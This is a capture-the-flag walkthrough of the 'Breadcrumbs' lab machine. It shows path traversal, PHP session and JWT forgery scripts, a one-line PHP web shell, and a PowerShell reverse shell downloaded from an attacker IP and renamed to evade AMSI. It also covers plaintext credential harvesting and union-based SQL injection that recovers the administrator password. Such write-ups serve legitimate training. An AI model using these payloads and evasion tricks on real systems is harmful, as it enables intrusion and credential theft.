@@ -1,0 +1,421 @@
+Breadcrumbs
+
+14th July 2021 / Document No D21.100.123
+Prepared By: MinatoTW
+Machine Author(s): helich0pper
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Breadcrumbs is a hard difficulty Windows machine running Apache web server with a library application.
+Directory enumeration and file read is leveraged to forge cookies and login as the administrator. A foothold
+is gained via unrestricted file upload. Plaintext credentials in a SQLite database assists in lateral movement.
+Finally, exploitation of SQL injection results in privilege escalation to windows administrator user.
+
+Skills Required
+
+      Enumeration
+      Scripting
+      Code Review
+
+Skills Learned
+
+      Forging PHP sessions
+      SQL Injection
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.228 | grep '^[0-9]' | cut -d '/' -f 1
+   | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -Pn -sC -sV 10.10.10.228
+
+We find a Windows server running SSH and Apache web server on both HTTP and HTTPS ports. Additionally,
+a MySQL server is also found running, which is a hint towards a SQL powered web application.
+
+Apache
+
+Browsing to port 80 reveals a page titled Library with a single button.
+The same page is hosted on the HTTPS server as well. Clicking on the button takes us to a search form.
+Clicking on the Book button for any book opens up a pop-up with the description.
+Gobuster
+
+Before testing the application for vulnerabilities, let's perform a directory enumeration using gobuster.
+   gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-
+   medium.txt -u http://10.10.10.228 -t 50
+
+We observe a couple of interesting folders, namely books and portal . Browsing to the books folder lists
+few HTML files.
+
+Looking at these files will reveal the contents of the description we found earlier.
+It's possible that the application is loading the book description from these files directly. Let's look at the
+portal folder next.
+
+We come across a login page which states that we're restricted for further investigation. There's also a Sign
+up page which can be used to create a new account. Let's make an account and login.
+The panel offers few options along with user and file management pages. Clicking on File Management
+redirects us back to the main page. But, clicking on User management takes us to the page below.
+
+Let's take a note of these and perform another gobuster scan on the portal folder.
+   gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-
+   medium.txt -u http://10.10.10.228/portal -t 50 -x php
+We view an uploads folder along with a cookie.php file, which might contain the code for the cookie
+generation.
+
+Arbitrary file read
+
+We inspect again the search functionality. We can test for SQL injection by entering a quote in the Title
+field.
+The server responds with an entry having quote in it. This means that the quote was escaped and injection
+failed. Let's see what happens when we click on the Book button by intercepting the request in Burp.
+
+We notice a POST request where the book parameter points to the HTML file in the books directory we
+found earlier. This confirms that the application retrieves the description from those HTML files.
+We check if we can load arbitrary files by altering the parameter.
+As we can see, we are able to include the win.ini file by setting the parameter to
+..\..\..\..\..\..\windows\win.ini . This means that the application is vulnerable to path traversal and
+arbitrary file read.
+
+We look at the files we discovered during enumeration of the portal folder. The login.php file can be
+included using ..\portal\login.php as the payload. We also notice that this page includes
+authController.php . Let's look at that next.
+We can now copy the contents and format it to review the code. The following snippet is executed after a
+user logs in successfully.
+
+   session_id(makesession($username));
+   session_start();
+
+   $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
+   $data = array();
+
+   $payload = array(
+          "data" => array(
+                 "username" => $username
+
+   ));
+
+   $jwt = JWT::encode($payload, $secret_key, 'HS256');
+
+   setcookie("token", $jwt, time() + (86400 * 30), \"\/\");
+
+   $_SESSION['username'] = $username;
+   $_SESSION['loggedIn'] = true;
+   if($userdata[0]['position'] == \"\"){
+
+          $_SESSION['role'] = \"Awaiting approval\";
+   }
+   else{
+
+          $_SESSION['role'] = $userdata[0]['position'];
+   }
+
+   header("Location: /portal");
+
+We observe that it calls makesession with the username as argument. It also creates a JWT and returns it
+to the client. The code for makesession can be found in the cookie.php file.
+
+   <?php
+   /**
+
+     * @param string $username Username requesting session cookie
+     *
+     * @return string $session_cookie Returns the generated cookie
+     *
+     * @devteam
+     * Please DO NOT use default PHPSESSID; our security team says they are predictable.
+     * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
+     * */
+   function makesession($username){
+
+          $max = strlen($username) - 1;
+          $seed = rand(0, $max);
+          $key = "s4lTy_stR1nG_". $username[$seed] . "(!528./9890";
+          $session_cookie = $username.md5($key);
+
+          return $session_cookie;
+   }
+
+This function generates a random session ID as opposed to the one generated by default. The key is
+generated by concatenating strings with a random character from the username. The final session ID is
+returned as username + md5(key) . We can see this in our existing session where the username is test .
+
+Let's also review the code at the File management page at ../portal/php/files.php .
+
+   <?php
+   session_start();
+   $LOGGED_IN = false;
+   if($_SESSION['username'] !== "paul"){
+
+          header("Location: ../index.php");
+   }
+   if(isset($_SESSION['loggedIn'])){
+
+          $LOGGED_IN = true;
+          require '../db/db.php';
+   }
+   else{
+          header("Location: ../auth/login.php");
+          die();
+   }
+   ?>
+
+Code checks if the username is set to paul or else redirects the client. This means we need to forge a
+session ID for user paul . We write a script to do that.
+
+   from requests import get
+   from hashlib import md5
+
+   username = "paul"
+
+   for i in username:
+          key = "s4lTy_stR1nG_" + i + "(!528./9890"
+          sessid = username + md5(key.encode()).hexdigest()
+          cookie = { "PHPSESSID" : sessid }
+          resp = get("http://10.10.10.228/portal/php/files.php", cookies=cookie,
+
+   allow_redirects=False)
+          if resp.status_code != 302:
+                 print(f"Valid session ID: {sessid}")
+
+The script generates a session ID with every letter and then tries requesting the file management page. A
+valid session ID is found if we aren't redirected.
+
+Running the script gives us a result so we browse to the portal and then replace the cookie from the
+Storage tab in devtools.
+Refreshing the page log us in as paul successfully.
+We can now browse to the File management page and try uploading a zip file.
+However, the upload fails due to insufficient privileges.
+
+Unrestricted file upload
+
+Intercepting the request in Burp present us a post request to includes/fileController.php . We try
+looking at it's source code.
+
+   <?php
+   $ret = "";
+   require "../vendor/autoload.php";
+   use \\Firebase\\JWT\\JWT;
+   session_start();
+
+   function validate(){
+          $ret = false;
+          $jwt = $_COOKIE['token'];
+
+          $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
+          $ret = JWT::decode($jwt, $secret_key, array('HS256'));
+          return $ret;
+   }
+
+   if($_SERVER['REQUEST_METHOD'] === "POST"){
+          $admins = array("paul");
+          $user = validate()->data->username;
+          if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
+                 error_reporting(E_ALL & ~E_NOTICE);
+                 $uploads_dir = '../uploads';
+                 $tmp_name = $_FILES["file"]["tmp_name"];
+                 $name = $_POST['task'];
+
+                 if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
+                         $ret = "Success. Have a great weekend!";
+
+                 }
+                 else{
+
+                         $ret = "Missing file or title :(" ;
+                 }
+          }
+          else{
+                 $ret = "Insufficient privileges. Contact admin or developer to upload code.
+   Note: If you recently registered, please wait for one of our admins to approve it.";
+          }
+
+          echo $ret;
+   }
+
+By reviewing the code we understand that the server checks the JWT cookie as well as the session cookie.
+We can forge a JWT cookie ourselves with the secret key.
+
+   >>> import jwt
+   >>> data = { "data" : { "username" : "paul" } }
+   >>> jwt.encode(data,
+   "6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e", algorithm="HS256")
+   'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76Y
+   srWhi_gu23bzYLYWxqORkr0WtEz_IUtCU'
+
+Switch to the browser and replace the token cookie with the JWT generated above. We can also see that
+the code doesn't inspect the uploaded file for Content-Type or the extension. This will let us upload a web
+shell.
+Foothold
+
+We try to upload the zip again and intercept the request. We alter the data to a PHP web shell code.
+   <?=`$_GET[0]`?>
+
+We can now execute commands via the GET parameter 0 .
+The Invoke-PowerShellTcp.ps1 script can be used to gain a reverse shell.
+
+   wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-
+   PowerShellTcp.ps1 -O tcp.ps1
+   echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 4444' >> tcp.ps1
+   sed -i "s/PowerShellTcp/tcpps/g" tcp.ps1
+We download the shell and then add the execution to the last line. We also replace PowerShellTcp with
+tcpps to evade AMSI detection.
+
+   curl http://10.10.10.228/portal/uploads/shell.php -G --data-urlencode '0=powershell
+   iex(iwr http://10.10.14.6/tcp.ps1 -useb)'
+
+The command above will execute it and a shell can be received as user www-data .
+Lateral Movement
+
+Enumerating the folders reveals pizzaDeliveryUserData in the portal folder.
+
+We notice a few files with .disabled extension and a juliette.json file.
+   {
+                 "pizza" : "margherita",
+                 "size" : "large",
+                 "drink" : "water",
+                 "card" : "VISA",
+                 "PIN" : "9890",
+                 "alternate" : {
+                                "username" : "juliette",
+                                "password" : "jUli901./())!",
+                 }
+   }
+
+We capture a password in the JSON file for the user juliette . Logging in via SSH using these credentials is
+successful.
+Privilege Escalation
+
+After some basic enumeration we locate the todo.html file on the user's Desktop that has some
+interesting notes.
+
+   <table>
+                 <tr>
+                         <th>Task</th>
+                         <th>Status</th>
+                         <th>Reason</th>
+                 </tr>
+                 <tr>
+                         <td>Configure firewall for port 22 and 445</td>
+                         <td>Not started</td>
+                         <td>Unauthorized access might be possible</td>
+                 </tr>
+                 <tr>
+                         <td>Migrate passwords from the Microsoft Store Sticky Notes application to
+
+   our new password manager</td>
+                         <td>In progress</td>
+                         <td>It stores passwords in plain text</td>
+
+                 </tr>
+                 <tr>
+
+                         <td>Add new features to password manager</td>
+                         <td>Not started</td>
+                         <td>To get promoted, hopefully lol</td>
+                 </tr>
+   </table>
+
+It refers to some migrating passwords from Sticky Notes to a password manager. This post provides the
+location where Sticky notes stores it's data.
+
+   %LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
+The folder indeed exists and the plum.sqlite database can be found as well. We copy this locally for
+further inspection.
+
+   scp
+   'juliette@10.10.10.228:/Users/juliette/AppData/Local/Packages/Microsoft.MicrosoftSticky
+   Notes_8wekyb3d8bbwe/LocalState/plum.*' .
+   sqlite3 plum.sqlite
+
+We obtain a possible password for the development account. We can log-in as this user with the
+discovered credentials.
+This user is found to have access to the C:\Development folder.
+We find a single file named Krypter_Linux . We download this and examine it locally.
+   scp development@10.10.10.228:/Development/Krypter_Linux .
+
+It's found to be a 32 bit ELF binary. We open it up with tool Ghidra for further analysis.
+   undefined8 main(int param_1,long param_2)
+   {
+      puts(
+              "Krypter V1.2\n\nNew project by Juliette.\nNew features added weekly!\nWhat to
+   expect next update:\n\t- Windows version with GUI support\n\t- Get password from cloud
+   and AUTOMATICALLY decrypt!\n***\n"
+              );
+   <SNIP>
+          if (local_1c == 0x641) {
+              if (local_28 != 0) {
+                 puts("Requesting decryption key from cloud...\nAccount: Administrator");
+                 curl_easy_setopt(local_28,0x2712,"http://passmanager.htb:1234/index.php");
+     curl_easy_setopt(local_28,0x271f,"method=select&username=administrator&table=passwords
+   ");
+
+                 curl_easy_setopt(local_28,0x4e2b,WriteCallback);
+                 curl_easy_setopt(local_28,0x2711,local_58);
+                 local_2c = curl_easy_perform(local_28);
+                 curl_easy_cleanup(local_28);
+                 puts("Server response:\n\n");
+                 this = std::operator<<((basic_ostream *)std::cout,local_58);
+                 std::basic_ostream<char,std::char_traits<char>>::operator<<
+
+                                    ((basic_ostream<char,std::char_traits<char>> *)this,
+                                     std::endl<char,std::char_traits<char>>);
+
+              }
+          }
+          else {
+
+              puts("Incorrect master key");
+          }
+      }
+   <SNIP>
+It's purpose appears to be the retrieval of a key from the cloud and then the decryption of the user's
+password. The binary is found to request http://passmanager.htb:1234/index.php via libcurl.
+The POST data method=select&username=administrator&table=passwords seems like an SQL query. By
+using our current SSH session and inspect the open ports, we find port 1234 indeed open.
+
+Let's forward this port and further enumerate the server.
+
+   ssh -L 1234:127.0.0.1:1234 development@10.10.10.228 -N
+We can try to use the query extracted from the binary in order to test it.
+   curl localhost:1234 -d 'method=select&username=administrator&table=passwords'
+
+We obtain the AES key for the Administrator's password, but we don't have the encrypted password yet.
+From the request format, we can guess the SQL query to be:
+
+   SELECT aes_key FROM passwords;
+Let's try performing an union based injection.
+
+   curl localhost:1234 -d 'method=select&username=administrator&table=passwords UNION
+   select 1-- -'
+
+The injection is indeed successful and we get the value 1 . We try to list all tables in the database.
+   curl localhost:1234 -d 'method=select&username=&table=passwords UNION select table_name
+   from information_schema.tables where table_schema=database()-- -
+We query the information_schema.tables table for all tables in the current database. This only returns
+the passwords table. We look at the columns in this table.
+
+   curl localhost:1234 -d 'method=select&username=&table=passwords UNION select
+   column_name from information_schema.columns where table_schema=database()-- -'
+This gives us the columns id , account , password and aes_key . It's likely that the encrypted password is
+in the password column. We retrieve this data.
+
+   curl localhost:1234 -d 'method=select&username=&table=passwords UNION select password
+   from passwords-- -'
+We capture a single base64 encoded string H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= . We
+already know that the encryption algorithm is AES. We can now try to decrypt it using pyaes .
+
+   import pyaes
+   from base64 import b64decode
+   key = b"k19D193j.<19391("
+   aes = pyaes.AESModeOfOperationCBC(key)
+   enc = b64decode("H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=")
+   dec = b''
+   for i in range(0, len(enc), 16):
+
+          dec += aes.decrypt(enc[i:i+16])
+   print(dec)
+Running the script returns the password in plaintext.
+
+The password is highlighted in green and the padding at the end can be ignored.
+Finally logging in as user Administrator with this password is successful.
+
